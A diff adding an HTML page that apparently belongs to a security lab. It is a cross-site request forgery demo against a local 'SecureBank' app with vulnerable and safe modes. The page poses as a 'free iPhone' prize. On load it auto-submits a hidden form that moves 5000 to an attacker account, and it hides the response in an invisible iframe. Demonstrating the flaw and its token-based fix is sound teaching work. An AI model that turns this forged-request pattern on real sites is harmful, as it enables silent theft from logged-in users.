@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <title>Win a free iPhone!</title>
+</head>
+<body>
+  <!--
+    CSRF attack page.
+
+    This page pretends to be an unrelated site ("free iPhone"). If the victim
+    is logged into SecureBank in the same browser, simply opening this page
+    silently submits a transfer FROM the victim TO the attacker's account,
+    because the VULNERABLE version does not check any anti-CSRF token before
+    moving money.
+
+    The brief allows hosting this page on the same origin as the target app,
+    so we serve it from /attacker/csrf.html. In VULNERABLE mode the transfer
+    succeeds; in SAFE mode the server rejects it (missing/invalid CSRF token).
+
+    The form posts into a hidden iframe so the victim never sees the redirect.
+  -->
+  <h1>Congratulations! You won a free iPhone 🎉</h1>
+  <p>Please wait while we prepare your prize...</p>
+
+  <iframe name="sink" style="display:none"></iframe>
+  <form id="attack" action="http://localhost:3000/transfer" method="POST" target="sink">
+    <input type="hidden" name="to_account" value="66666666" />
+    <input type="hidden" name="amount" value="5000" />
+  </form>
+
+  <script>
+    // Auto-fire the forged request as soon as the page loads.
+    document.getElementById("attack").submit();
+  </script>
+</body>
+</html>
